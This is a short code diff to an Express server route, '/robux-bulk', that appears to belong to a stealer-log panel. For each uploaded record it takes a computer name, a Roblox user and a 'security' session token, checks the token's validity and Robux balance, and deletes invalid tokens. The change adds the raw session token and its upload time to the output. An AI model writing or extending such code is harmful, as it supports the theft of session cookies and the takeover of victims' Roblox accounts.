@@ -789,7 +789,7 @@ app.post('/robux-bulk', requireAuth, async (req, res) => {
     const roblox = doc.roblox || {};
     try {
       const info = await fetchRobuxInfo(roblox.security);
-      results.push({ file: doc.name, originalName: doc.originalName, computer: doc.computer?.name || 'Unknown', user: roblox.user, ...info });
+      results.push({ file: doc.name, originalName: doc.originalName, computer: doc.computer?.name || 'Unknown', user: roblox.user, security: roblox.security, uploadedAt: doc.uploadedAt, ...info });
       if (!info.valid) {
         await removeInvalidToken(db, user, doc.name);
         console.log(`[${new Date().toLocaleTimeString()}] 🗑 Невалидный токен удалён: ${doc.name}`);
